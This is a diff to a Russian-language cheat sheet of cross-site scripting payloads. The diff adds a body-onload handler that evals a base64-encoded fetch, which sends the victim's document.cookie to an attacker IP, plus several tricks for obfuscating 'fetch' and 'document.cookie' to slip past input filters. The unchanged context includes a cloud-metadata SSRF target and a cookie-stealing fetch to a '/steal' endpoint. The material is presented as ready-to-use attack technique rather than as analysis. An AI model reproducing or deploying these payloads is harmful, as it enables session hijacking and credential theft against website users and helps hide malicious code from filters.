@@ -49,9 +49,7 @@ data: target=http://169.254.169.254/latest/meta-data/
 ---
 
 
-## 💥 ПЕЙЛОАДЫ ДЛЯ ФОРМ
-
-
+## 💥 ПЕЙЛОАДЫ
 
 ### 🧪 ДРУГИЕ ТЕГИ ДЛЯ ОБХОДА (если `script` не работает)
 
@@ -67,6 +65,7 @@ data: target=http://169.254.169.254/latest/meta-data/
 ```html
 <embed src="http://YOUR_IP:8888/exploit">
 ```
+<body onload="eval(atob('ZmV0Y2goIi8vMTkyLjE2OC4xODcuMTM5Ojg4ODg/Yz0iK2RvY3VtZW50LmNvb2tpZSk='))"/>
 
 ### 🎨 ЧЕРЕЗ CSS (если можно загрузить свою тему)
 ```css
@@ -108,6 +107,19 @@ fetch("http://192.168.187.139:8885/steal?c=" + document.cookie, {mode: 'no-cors'
 Если хоть один запрос пришёл на твой сервер — значит, можно выполнить код.
 
 ---
+
+### ОБФУСКАЦИЯ FETCH
+window['fet' + 'ch']
+window[['f','e','t','c','h'].join('')]
+window[atob('ZmV0Y2g=')]
+window[`${'fet'}${'ch'}`]
+
+# ОБФУСКАЦИЯ DOCUMENT.COOKIE
+
+document['coo' + 'kie']
+document[['c','o','o','k','i','e'].join('')]
+document[atob('Y29va2ll')]
+document[`${'coo'}${'kie'}`]
 
 ### 🧠 ПОЧЕМУ ЭТО ВАЖНО
 Иногда фильтр режет `fetch`, `XMLHttpRequest`, `onerror`, но пропускает `src`, `href` или `data`. В таких случаях внешний скрипт — единственный способ заставить браузер выполнить твой код.
